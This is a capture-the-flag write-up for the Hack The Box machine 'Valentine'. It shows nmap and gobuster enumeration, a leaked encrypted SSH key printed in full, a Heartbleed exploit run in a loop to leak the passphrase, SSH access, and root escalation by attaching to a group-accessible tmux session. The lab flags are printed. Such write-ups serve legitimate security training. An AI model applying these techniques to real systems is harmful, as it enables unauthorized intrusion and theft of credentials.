# Valentine
>Author : Xyan1d3
>Date : 5th July 2021
>IP : 10.10.10.79
>OS : Linux
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Mon Jul  5 01:24:24 2021 as: nmap -sC -sV -v -oN nmap/valentine 10.10.10.79
Nmap scan report for valentine.htb (10.10.10.79)
Host is up (0.071s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-02-06T00:45:25
| Not valid after:  2019-02-06T00:45:25
| MD5:   a413 c4f0 b145 2154 fb54 b2de c7a9 809d
|_SHA-1: 2303 80da 60e7 bde7 2ba6 76dd 5214 3c3c 6f53 01b1
|_ssl-date: 2021-07-04T19:54:49+00:00; +5s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 4s
```

## Gobuster
```python
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/valentine]
└──╼ # gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.79
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/05 01:37:23 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]
/decode               (Status: 200) [Size: 552]
/omg                  (Status: 200) [Size: 153356]
/server-status        (Status: 403) [Size: 292]
```

## Web Enumeration
We visit the site and find out that we have a graphic which remembers me of a `SSL heartbleed` vulnerability.
![[Pasted image 20210705013608.png]]

The `https` and `http` site point to the same page.
From, The gobuster we find out that we have a `/dev/` webdirectory which has a `hype_key` and a `notes.txt`.
![[Pasted image 20210705013922.png]]

We open the `hype_key` and find out that we have something that looks like to be hex.
![[Pasted image 20210705014019.png]]

We could copy the data and put it to `cyberchef` and find out that it is `hex` data which can be decoded to an encrypted OpenSSH private key.
![[Pasted image 20210705014137.png]]
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Unfortunately, We cannot crack the passphrase of this SSH private key with classic `ssh2john` and JtR.

The SSL `HeartBleed` attack leaks the memory of the webserver and this can cause the webserver to leak some important data to us.
We could search for any possible exploits for this vulnerability.
![[Pasted image 20210705015928.png]]
Here, I would be using a `python` exploit as it is easy to use and fix.

For, needing to pull of this exploit we need to generate traffic so that the webserver does something in the background. Here, We could use the `encode` and `decode` features listed by the `gobuster`.

We run the python exploit using `watch`
```python
watch -n 0.5 "python 32745.py 10.10.10.79  >> op"
```
This will run the exploit and leak the memory and append it to a file for us to look at afterwards. After filtering a lot of `00` lines ofcourse.

While, The `watch` command is running we have to generate traffic by doing arbitrary `encode` or `decode` features.

We do `cat op |grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'|less` to remove the `00` from the file.

If We are lucky enough we will be able to get a `base64` data which is useful.
![[Pasted image 20210705020608.png]]

We could base64 decode it and find out that it is a string.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/valentine]
└──╼ # echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=="|base64 -d
heartbleedbelievethehype
```

This could be the SSH passphrase.

# Initial FootHold as hype
We use the OpenSSH private key aquired from the `/dev` webdirectory with the passphrase `heartbleedbelievethehype` aquired from the hearbleed attack to SSH into the box as `hype`.
```
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/valentine]
└──╼ # ssh -i hype_key hype@10.10.10.79
Enter passphrase for key 'hype_key': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun Jul  4 13:38:45 2021 from 10.10.14.9
hype@Valentine:~$ id
uid=1000(hype),gid=1000(hype),groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
```

## Getting the user Flag
```
hype@Valentine:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
hype@Valentine:~$ cd Desktop/
hype@Valentine:~/Desktop$ ls
user.txt
hype@Valentine:~/Desktop$ cat user.txt 
e6710a5464769fd5fcd216e076961750
```

# Root Escalation
For, Root Escalation we do a simple `ps aux` and list the process and find out that we have `tmux` running with  a socket on `/.devs/dev_sess`
![[Pasted image 20210705023030.png]]
```python
hype@Valentine:/.devs$ ls -la
total 8
drwxr-xr-x  2 root hype 4096 Jul  4 12:53 .
drwxr-xr-x 26 root root 4096 Feb  6  2018 ..
srw-rw----  1 root hype    0 Jul  4 12:53 dev_sess
```

Here, We see that the tmux socket is user owned by `root` but, group owned by `hype` which is us. Therefore, We can attach to the tmux session.
```python
hype@Valentine:~$ tmux -S /.devs/dev_sess attach
```

![[Pasted image 20210705023713.png]]

We see that the attached session is running as root. So, We could now get the root Flag.

## Getting the root Flag
```python
root@Valentine:/# cd /root/
root@Valentine:~# ls -l
total 8
-rwxr-xr-x 1 root root 388 Dec 13  2017 curl.sh
-rw-r--r-- 1 root root  33 Dec 13  2017 root.txt
root@Valentine:~# cat root.txt 
f1bb6d759df1f272914ebbc9ed7765b2
```